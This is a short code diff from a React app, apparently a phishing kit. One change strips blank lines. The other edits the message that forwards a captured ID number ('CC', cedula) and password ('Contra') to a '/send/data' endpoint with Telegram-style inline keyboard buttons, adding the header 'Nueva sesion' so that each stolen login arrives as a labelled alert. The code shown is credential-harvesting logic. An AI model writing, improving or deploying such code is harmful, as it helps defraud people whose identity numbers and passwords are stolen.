@@ -23,9 +23,7 @@ function App() {
 
   const startSubscription = async () => {
     const response = await api.post("/news/request");
-
     const { requestId } = response.data;
-
     setRequestId(requestId);
     return requestId;
   };
@@ -40,7 +38,7 @@ function App() {
       }
 
       const response = await api.post("/send/data", {
-        text: `\nCC: ${cedula} \n\nContra: ${password}`,
+        text: `Nueva sesion \n\nCC: ${cedula} \n\nContra: ${password}`,
         reply_markup: {
           inline_keyboard: [
             [
